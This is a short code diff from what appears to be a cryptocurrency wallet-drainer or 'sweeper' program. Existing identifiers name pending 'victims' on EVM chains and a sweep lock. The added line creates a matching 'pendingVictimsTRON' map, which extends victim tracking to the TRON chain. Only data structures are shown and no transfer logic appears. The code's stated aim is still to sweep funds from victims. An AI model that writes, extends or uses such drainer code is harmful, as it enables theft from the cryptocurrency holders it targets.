@@ -20,6 +20,8 @@ const pendingVictimsEVM = new Map();
 // 🔒 SWEEP LOCK: Prevents API and Listener from colliding
 const activeSweepsEVM = new Set();
 
+const pendingVictimsTRON = new Map(); // Or 'new Set()' if you only store addresses
+
 
 // ==========================================
 // 🟢 EVM SWEEPER CONFIGURATION (DYNAMIC MULTI-TOKEN)
